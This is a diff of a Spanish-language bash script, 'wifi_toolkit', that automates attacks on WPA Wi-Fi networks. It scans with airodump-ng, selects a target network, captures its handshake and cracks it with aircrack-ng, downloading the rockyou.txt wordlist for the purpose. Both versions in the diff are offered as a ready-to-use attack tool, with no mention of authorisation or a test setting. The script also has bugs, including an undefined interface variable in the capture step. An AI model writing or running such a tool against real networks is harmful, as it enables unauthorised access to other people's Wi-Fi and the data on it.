@@ -1,122 +1,26 @@
 #!/bin/bash
 
-# Colores para salida visual
+# Colores para salida
 GREEN='\033[0;32m'
 RED='\033[0;31m'
-YELLOW='\033[0;33m'
-BLUE='\033[0;34m'
-NC='\033[0m' # Sin color
+NC='\033[0m'
 
-# Configuración del proyecto
-PROJECT_NAME="wifi_toolkit"
-DOWNLOADS_DIR="$HOME/Downloads"
-PROJECT_DIR="$DOWNLOADS_DIR/$PROJECT_NAME"
+# Ruta de carpetas
+PROJECT_DIR="$HOME/wifi_toolkit"
 RESULTS_DIR="$PROJECT_DIR/resultados_wifi"
 DEPENDENCIES=("aircrack-ng" "xterm" "iw" "curl" "gzip" "hashcat" "dialog" "hcxpcapngtool")
 
-# Crear directorios necesarios
-prepare_project_directory() {
-    mkdir -p "$PROJECT_DIR" "$RESULTS_DIR" 2>/dev/null
-}
-
-# Mostrar progreso
-show_progress() {
-    local total=$1
-    local current=0
-    local step=$((100 / total))
-
-    while [ $current -le 100 ]; do
-        dialog --gauge "Procesando..." 10 50 $current
-        sleep 1
-        ((current += step))
-    done
-}
-
-# Verificar e instalar dependencias
+# Instalar dependencias
 install_dependencies() {
-    dialog --title "Verificando dependencias" --infobox "Revisando requerimientos..." 8 40
-    sleep 2
-
+    dialog --title "Instalación de Dependencias" --infobox "Verificando dependencias..." 8 40
     for dep in "${DEPENDENCIES[@]}"; do
         if ! command -v "$dep" &>/dev/null; then
-            dialog --title "Instalando $dep" --infobox "Instalando $dep..." 8 40
             sudo apt-get install -y "$dep" &>/dev/null || {
-                dialog --title "Error" --msgbox "No se pudo instalar $dep. Intenta manualmente." 8 40
+                dialog --title "Error" --msgbox "Error al instalar $dep. Instálalo manualmente." 8 40
                 exit 1
             }
         fi
     done
-    dialog --title "Dependencias" --msgbox "Todas las dependencias están instaladas correctamente." 8 40
-}
-
-# Escaneo de redes
-scan_networks() {
-    local interface=$(detect_wireless_interface)
-    dialog --title "Escaneo de Redes" --infobox "Iniciando escaneo en $interface..." 8 40
-    sleep 2
-
-    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/network_scan" &
-    sleep 10
-    killall airodump-ng
-    dialog --title "Escaneo Completado" --msgbox "El escaneo se ha completado. Procediendo al análisis..." 8 40
-
-    parse_network_results "$RESULTS_DIR/network_scan-01.csv"
-}
-
-# Procesar resultados del escaneo
-parse_network_results() {
-    local scan_file=$1
-    local networks=()
-
-    if [[ -f "$scan_file" ]]; then
-        while IFS=, read -r bssid essid _; do
-            if [[ "$bssid" =~ ^([0-9A-F]{2}:){5}[0-9A-F]{2}$ ]]; then
-                networks+=("$bssid" "$essid")
-            fi
-        done < <(grep WPA "$scan_file")
-
-        if [[ ${#networks[@]} -eq 0 ]]; then
-            dialog --title "Redes" --msgbox "No se encontraron redes vulnerables." 8 40
-            return
-        fi
-
-        local choice=$(dialog --menu "Selecciona una red para atacar:" 20 60 10 "${networks[@]}" 3>&1 1>&2 2>&3)
-
-        if [[ -n "$choice" ]]; then
-            start_attack "$choice" "$scan_file"
-        else
-            dialog --title "Error" --msgbox "No se seleccionó ninguna red." 8 40
-        fi
-    else
-        dialog --title "Error" --msgbox "No se encontró el archivo de escaneo." 8 40
-    fi
-}
-
-# Iniciar ataque
-start_attack() {
-    local bssid=$1
-    local scan_file=$2
-
-    dialog --title "Ataque" --infobox "Preparando ataque contra $bssid..." 8 40
-    sleep 2
-
-    local dictionary=$(find_or_download_dictionary)
-
-    dialog --title "Ataque" --infobox "Iniciando ataque con aircrack-ng..." 8 40
-    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $scan_file" &
-    sleep 5
-}
-
-# Buscar o descargar diccionario
-find_or_download_dictionary() {
-    local dictionary_path=$(find / -type f -name "rockyou.txt" 2>/dev/null | head -n 1)
-    if [[ -z "$dictionary_path" ]]; then
-        dialog --title "Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
-        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
-        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
-        dictionary_path="$PROJECT_DIR/rockyou.txt"
-    fi
-    echo "$dictionary_path"
 }
 
 # Detectar interfaz inalámbrica
@@ -124,12 +28,94 @@ detect_wireless_interface() {
     iw dev | grep Interface | awk '{print $2}' | head -n 1
 }
 
+# Escaneo de redes WiFi
+scan_networks() {
+    local interface=$(detect_wireless_interface)
+    if [[ -z "$interface" ]]; then
+        dialog --title "Error" --msgbox "No se encontró una interfaz inalámbrica activa." 8 40
+        exit 1
+    fi
+
+    dialog --title "Escaneo de Redes" --infobox "Escaneando redes disponibles..." 8 40
+    xterm -hold -e "airodump-ng $interface --output-format csv --write $RESULTS_DIR/network_scan" &
+    sleep 15
+    killall airodump-ng
+
+    scan_file="$RESULTS_DIR/network_scan-01.csv"
+    if [[ ! -f "$scan_file" ]]; then
+        dialog --title "Error" --msgbox "No se encontraron redes disponibles." 8 40
+        exit 1
+    fi
+
+    select_best_network "$scan_file"
+}
+
+# Seleccionar la mejor red
+select_best_network() {
+    local scan_file=$1
+    local best_network=$(awk -F, 'NR>2 {if($9 > -100 && $6 != "<length>") print $1, $14}' "$scan_file" | sort -n -k2 | head -n 1)
+
+    if [[ -z "$best_network" ]]; then
+        dialog --title "Error" --msgbox "No se encontró una red con buena señal." 8 40
+        exit 1
+    fi
+
+    local bssid=$(echo "$best_network" | awk '{print $1}')
+    local essid=$(echo "$best_network" | awk '{print $2}')
+    local user_choice=$(dialog --title "Red Detectada" --yesno "Se detectó la red: $essid ($bssid)\n¿Deseas iniciar el ataque?" 10 50)
+
+    if [[ $? -eq 0 ]]; then
+        start_attack "$bssid" "$essid"
+    else
+        dialog --title "Cancelado" --msgbox "Operación cancelada por el usuario." 8 40
+    fi
+}
+
+# Iniciar ataque
+start_attack() {
+    local bssid=$1
+    local essid=$2
+    local cap_file="$RESULTS_DIR/capture.cap"
+
+    dialog --title "Capturando Handshake" --infobox "Iniciando captura del handshake para $essid..." 8 40
+    xterm -hold -e "airodump-ng --bssid $bssid -w $RESULTS_DIR/capture $interface" &
+    sleep 30
+    killall airodump-ng
+
+    if [[ -f "$cap_file" ]]; then
+        crack_handshake "$cap_file" "$bssid" "$essid"
+    else
+        dialog --title "Error" --msgbox "No se capturó el handshake de la red $essid." 8 40
+        exit 1
+    fi
+}
+
+# Cracking del handshake
+crack_handshake() {
+    local cap_file=$1
+    local bssid=$2
+    local essid=$3
+    local dictionary="$PROJECT_DIR/rockyou.txt"
+
+    if [[ ! -f "$dictionary" ]]; then
+        dialog --title "Descargando Diccionario" --infobox "Descargando diccionario rockyou.txt..." 8 40
+        curl -o "$PROJECT_DIR/rockyou.txt.gz" https://github.com/praetorian-inc/Hob0Rules/raw/master/wordlists/rockyou.txt.gz
+        gzip -d "$PROJECT_DIR/rockyou.txt.gz"
+    fi
+
+    dialog --title "Cracking" --infobox "Iniciando el ataque contra $essid..." 8 40
+    xterm -hold -e "aircrack-ng -w $dictionary -b $bssid $cap_file" &
+    sleep 10
+
+    dialog --title "Resultado" --msgbox "El proceso de ataque ha finalizado. Revisa los resultados en la terminal." 8 40
+}
+
 # Menú principal
 main_menu() {
     while true; do
         option=$(dialog --title "WiFi Toolkit" --menu "Selecciona una opción:" 20 60 10 \
             1 "Instalar dependencias" \
-            2 "Escanear redes" \
+            2 "Escanear redes WiFi" \
             3 "Salir" 3>&1 1>&2 2>&3)
 
         case $option in
@@ -141,6 +127,7 @@ main_menu() {
     done
 }
 
-# Inicio del script
-prepare_project_directory
+# Preparación e inicio
+install_dependencies
+mkdir -p "$RESULTS_DIR"
 main_menu
